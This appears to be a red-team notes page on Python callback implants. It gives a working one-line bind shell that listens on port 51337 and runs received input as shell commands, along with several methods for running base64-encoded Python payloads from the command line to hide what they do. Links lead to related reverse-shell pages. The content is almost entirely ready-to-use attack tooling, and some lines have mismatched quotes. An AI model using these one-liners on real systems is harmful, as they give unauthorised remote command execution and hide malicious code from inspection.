# Python

## 01 - Bind Shell

```
> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## 02 - Base64 encoded one-line from CLI

Encode the python implant.

```
$ basenc -w 0 implant.py
```

Single quote

```
> python -c 'exec "<base64_payload>".decode("base64")'

$ echo "exec('<base64_payload>').decode('base64')) | python"
```

Double quote

```
> python -c "exec '<base64_payload>'.decode('base64')"

> python -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> python -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> python -c "exec \"<base64_payload>\".decode(\"base64\")"
```

Heredoc Base64

```
$ python - <<EOF
exec '<base64_payload>'.decode('base64')
EOF

$ python - <<EOF
exec "<base64_payload>".decode("base64")
EOF
```

---
## References

### Reverse Shells

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Implants/One-Liners/Windows/Reverse Shells/Python|One-Liners: Windows Python Reverse Shells]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Implants/One-Liners/Linux/Reverse Shells/Python|One-Liners: Linux Python Reverse Shells]]

### Bind Shells

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Implants/One-Liners/Linux/Bind Shells/Python|One-Liners: Linux Python Bind Shells]]

### Resources

- [don't code me on that: Python Reverse Shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823)

- [PuckieStyle: Python one-line b64 Shellcode](https://www.puckiestyle.nl/python-one-line-shellcode/)